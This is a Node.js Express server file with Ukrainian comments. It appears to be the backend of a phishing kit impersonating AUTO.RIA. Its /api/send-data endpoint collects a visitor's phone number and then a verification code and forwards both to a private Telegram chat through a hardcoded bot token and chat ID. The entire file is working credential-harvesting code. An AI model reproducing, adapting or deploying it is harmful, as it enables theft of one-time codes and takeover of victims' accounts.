const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
// ==============================

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '/')));

/**
 * Функція для відправки повідомлення у Telegram
 * Використовуємо MarkdownV2 для клікабельного номера
 */
async function sendToTelegram(message) {
    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'MarkdownV2'
    };

    try {
        const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Помилка API Telegram:', response.status, errorData);
            return false;
        }

        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Помилка відправки:', error);
        return false;
    }
}

// Ендпоінт для прийому даних
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code } = req.body;
    let message = '';

    // Екранування спеціальних символів для MarkdownV2
    const escapeMarkdown = (text) => {
        return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
    };

    if (step === 'phone' && phone) {
        const cleanPhone = phone.replace(/\D/g, ''); // тільки цифри
        const formattedPhone = phone.startsWith('+') ? phone : `+${cleanPhone}`;
        const clickablePhone = `[${escapeMarkdown(formattedPhone)}](tg://msg?url=${encodeURIComponent(formattedPhone)})`;

        message = `Проект: *AUTO\\.RIA*\nНомер телефона: ${clickablePhone}\nСтрана: *Украина*`;

    } else if (step === 'code' && code) {
        message = `Code:\n\`${escapeMarkdown(code)}\``;

    } else {
        return res.status(400).json({ success: false, message: 'Неправильні дані.' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        res.json({ success: true });
    } else {
        res.status(500).json({ success: false, message: 'Помилка відправки.' });
    }
});

// Запуск
app.listen(port, () => {
    console.log(`Сервер запущено на порту ${port}`);
});
